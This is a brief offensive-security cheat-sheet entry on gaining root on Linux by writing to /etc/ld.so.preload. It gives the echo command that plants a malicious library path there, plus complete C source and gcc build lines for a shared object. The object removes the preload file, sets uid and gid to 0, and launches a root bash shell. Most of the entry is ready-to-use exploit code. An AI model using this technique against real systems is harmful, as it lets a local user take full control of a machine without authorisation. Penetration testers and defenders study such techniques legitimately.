# Write to Root



### /etc/ld.so.preload

This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
If you can create it or modify it, you can just add a **path to a library that will be loaded** with each executed binary.

For example: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```


